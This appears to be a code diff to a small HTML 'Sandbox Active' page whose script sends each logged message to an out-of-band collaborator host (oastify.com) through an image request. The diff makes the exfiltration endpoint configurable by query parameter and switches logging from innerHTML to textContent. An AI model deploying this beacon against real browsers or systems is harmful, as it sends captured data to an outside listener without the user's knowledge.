@@ -5,11 +5,13 @@
 <h2>Sandbox Active</h2>
 <div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
 <script>
-const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+const EXFIL = new URLSearchParams(location.search).get('exfil') || 'https://YOUR_COLLABORATOR_ID.oastify.com';
 
 function log(msg) {
     const logDiv = document.getElementById('log');
-    logDiv.innerHTML += '<br>' + msg;
+    const entry = document.createElement('div');
+    entry.textContent = msg;
+    logDiv.appendChild(entry);
     new Image().src = EXFIL + '/?s=' + encodeURIComponent(msg);
     console.log('[SANDBOX]', msg);
 }
